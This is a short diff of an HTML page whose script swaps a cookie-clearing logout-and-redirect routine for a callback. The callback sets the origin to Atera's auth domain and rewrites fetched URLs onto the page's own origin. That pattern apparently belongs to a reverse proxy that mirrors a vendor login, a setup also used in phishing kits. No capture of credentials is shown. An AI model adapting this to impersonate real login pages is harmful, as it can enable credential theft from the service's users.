@@ -1,19 +1,24 @@
 <html><head>
 <script>
-(async () => {
-	document.cookie.split(';').forEach(cookie => {
-		const eqPos = cookie.indexOf('=');
-		const name = eqPos > -1 ? cookie.substring(0, eqPos) : cookie;
-		document.cookie = name + '=;expires=Thu, 01 Jan 1970 00:00:00 GMT';
-	});
-		
-	localStorage.clear();
-	await fetch("http://127.0.0.1:65000/logout?email=");
+origin = "https://auth.atera.com";
+window["get_html"] = false;
+
+html_callback = async function() {
+	let res = await originalFetch(serverAddress + "/location?url=" + encodeURIComponent(currentURL));
+	let url = fixURL(await res.text());
+	window.location.assign(url.replace(new URL(url).origin, document.location.origin));
+};
+	//document.cookie.split(';').forEach(cookie => {
+	//	const eqPos = cookie.indexOf('=');
+	//	const name = eqPos > -1 ? cookie.substring(0, eqPos) : cookie;
+	//	document.cookie = name + '=;expires=Thu, 01 Jan 1970 00:00:00 GMT';
+	//});
+	//	
+	//localStorage.clear();
+	//await fetch("http://127.0.0.1:65000/logout");
 	
-	window.location.href = "https://app.atera.com/new"
-})();
+	//window.location.href = "https://app.atera.com/new"
 </script>
 
 <script defer src="/get_html.js"></script>
-</script>
 </head></html>
